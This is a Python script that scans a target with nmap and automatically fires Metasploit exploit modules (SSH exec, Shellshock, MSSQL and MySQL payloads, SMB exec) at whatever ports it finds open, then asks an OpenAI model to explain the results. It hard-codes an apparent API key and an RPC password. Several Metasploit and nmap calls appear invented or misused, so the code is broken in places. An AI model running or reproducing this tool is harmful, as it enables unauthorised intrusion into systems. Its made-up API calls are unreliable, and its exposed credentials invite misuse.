import nmap
from pymetasploit3.msfrpc import MsfRpcClient
import openai
openai.api_key = "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"

# Define the target system
target = input()

# Create an instance of the Nmap Port Scanner
scanner = nmap.PortScanner()

nmap_scans = {
    'p1': '-Pn -sV -T4 -O -F',
    'p2': '-Pn -T4 -A -v',
    'p3': '-Pn -sS -sU -T4 -A -v',
    'p4': '-Pn -p- -T4 -A -v',
    'p5': '-Pn -sS -sU -T4 -A -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script=vuln',
    'p6': '-Pn --script http-apache-negotiation,c,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-php-version,http-robots.txt,http-shellshock,http-sitemap-generator,http-svn-enum,http-trace,http-userdir-enum,http-vuln-cve2015-1635,http-vuln-cve2017-5638,http-vuln-cve2017-8917,http-vuln-cve201',
    'p7': '-Pn -sU -T4  -p 53,69,111,123,137,138,161,162,445,500,514,520,623,626,1900,4500 --script broadcast-dhcp-discover,broadcast-dhcp6-discover,dns-service-discovery,snmp-info,snmp-sysdescr -vvv',
    'p8': '-Pn  --script banner -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,514,587,636,993,995,1025,1433,1521,2049,3306,3389,5900,5985,6000,6667,8000,8080,8443,8888,9100,9200,10000,49152,49153,49154,49155,49156,49157 -vvv',
    'p9': '-Pn -O -sS -sV -Pn -T4 --max-os-tries 2 --max-retries 1 --min-rtt-timeout 100ms --initial-rtt-timeout 500ms --max-rtt-timeout 3s --open -p 1-65535 -vvv',
    'p10': '-Pn --script=vuln,-Pn -O -sS -sV -Pn -T4 --max-os-tries 2 --max-retries 1 --min-rtt-timeout 100ms --initial-rtt-timeout 500ms --max-rtt-timeout 3s --open -p 1-65535 -vvv'
}

print("Please select a scan option:")
for key, value in nmap_scans.items():
    print(f"{key}: {value}")
selection = input("Enter option number: ")

# Scan the target system to discover hosts host open port and valunrbilty
scanner.scan(target, arguments=selection)
anyalyze = scanner.analyse_nmap_xml_scan()

# Get a list of discovered hosts and open ports
hosts = scanner.all_hosts()
open_ports = []
for host in hosts:
    for proto in scanner[host].all_protocols():
        lport = scanner[host][proto].keys()
        for port in lport:
            open_ports.append(port)

# Select exploit modules based on vulnerabilities found in the scan
exploits = []
for host in hosts:
    for vuln in scanner[host]['tcp']:
        if scanner[host]['tcp'][vuln]['state'] == 'open':
            if vuln == 22:
                # SSH Vuln
                exploits.append('exploit/unix/ssh/sshexec')
            elif vuln == 80:
                # HTTP Vuln
                exploits.append('exploit/multi/http/apache_mod_cgi_bash_env_exec')
            elif vuln == 1433:
                # Microsoft SQL Server Vuln
                exploits.append('exploit/windows/mssql/mssql_payload')
            elif vuln == 3306:
                # MySQL Vuln
                exploits.append('exploit/windows/mysql/mysql_payload')
            elif vuln == 3389:
                # Remote Desktop Protocol (RDP) Vuln
                exploits.append('exploit/windows/rdp/rdp_rce')
            elif vuln == 445:
                # SMB Vuln
                exploits.append('exploit/windows/smb/smb_exec')

# Connect to the Metasploit RPC server
client = MsfRpcClient('RX*;Y9oz', port=55552)

# Create a new Metasploit workspace
workspace = client.workspace.create('My Workspace')

# Create a new Metasploit project
project = client.pro.core.project_create('My Project', workspace)

# Create a new Metasploit target using the discovered host and port information
target = client.modules.use('auxiliary/scanner/portscan/nmap')
target['RHOSTS'] = ','.join(hosts)
target['PORTS'] = ','.join(open_ports)
target_id = client.targets.add(target)

# Launch the selected Metasploit exploit modules against the target
for exploit in exploits:
    # Select the exploit module to use against the target
    module = client.modules.use(exploit)
    module['TARGET'] = target_id

    # Launch the exploit against the target
    job_id = client.jobs.create(module)

    # Wait for the job to complete
    job = client.jobs.status(job_id)
    while job['busy']:
        job = client.jobs.status(job_id)

    # Forward the results to the OpenAI GPT-3 API for explanation
    explanation = openai.Completion.create(
        engine="davinci",
        prompt=f"explain {anyalyze} and Explain the result of running the {exploit} exploit module against {target}",
        max_tokens=1024,
        n=1,
        stop=None,
        temperature=0.5,
    )
    print(f"Result of {exploit}:\n{job['result']}\nExplanation: {explanation.choices[0].text}")
